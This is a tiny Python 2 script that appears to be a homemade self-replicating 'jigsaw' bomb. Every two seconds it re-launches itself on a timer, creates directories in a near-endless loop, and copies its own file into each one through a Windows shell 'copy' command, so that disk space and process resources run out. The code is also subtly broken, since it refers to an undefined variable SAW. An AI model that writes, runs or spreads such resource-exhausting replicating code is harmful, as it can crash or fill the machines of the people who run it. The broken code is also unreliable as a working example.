from sys import argv
import os
import threading

j0ker = argv
name = str (j0ker[0])
print name

def jigsaw():
	threading.Timer(2.0,jigsaw).start()
	for i in range (0,10000000000000):
		direct = SAW+str(i)

		os.mkdir(direct)
		#para windows
		os.system("copy" + " "+name+" "+direct)

		

jigsaw()

input()
